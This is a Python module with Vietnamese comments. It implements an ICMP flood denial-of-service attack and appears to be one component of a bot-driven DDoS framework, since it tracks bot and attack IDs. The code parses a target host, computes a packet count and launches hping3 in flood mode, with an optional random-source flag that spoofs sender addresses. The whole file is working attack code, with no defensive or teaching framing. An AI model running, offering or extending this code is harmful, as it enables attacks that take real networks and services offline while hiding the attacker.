import asyncio
import subprocess
import logging
from urllib.parse import urlparse
from .base import BaseAttack

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class ICMPFlood(BaseAttack):
    async def execute(self):
        """Thực thi cuộc tấn công ICMP Flood bằng hping3."""
        logging.info(f"Bot {self.bot_id} bắt đầu tấn công với attack_id: {self.attack_id}")
        
        # Đảm bảo target_url có '/' ở cuối khi log
        # target_url = self.target.rstrip('/') + '/'
        
        # Lấy IP từ target_url
        try:
            parsed_url = urlparse(self.target)
            target_ip = parsed_url.hostname
            if not target_ip:
                logging.error("Không thể phân tích IP từ target_url")
                return
        except Exception as e:
            logging.error(f"Lỗi khi phân tích target_url: {e}")
            return

        # Tính tổng số gói tin
        total_packets = int(self.intensity * self.duration)
        
        # Lấy packet_size từ kwargs, mặc định 120 bytes nếu không có
        packet_size = self.kwargs.get("packet_size", 120)

        # Xây dựng lệnh hping3
        command = [
            "hping3",
            "--icmp",             # Gửi gói ICMP (echo request)
            "-c", str(total_packets),  # Tổng số gói
            "-d", str(packet_size),    # Kích thước dữ liệu
            "--flood",            # Gửi nhanh nhất có thể
            target_ip
        ]
        if self.kwargs.get("spoof_ip", False):
            command.insert(1, "--rand-source")  # Giả mạo IP nguồn

        logging.info(f"Chạy lệnh hping3: {' '.join(command)}")
        try:
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            await asyncio.sleep(self.duration)
            process.terminate()
            stdout, stderr = await process.communicate()
            logging.info(f"Kết quả ICMP Flood: {stdout.decode()}")
            if stderr:
                logging.error(f"Lỗi ICMP Flood: {stderr.decode()}")
        except Exception as e:
            logging.error(f"Lỗi khi chạy ICMP Flood: {e}")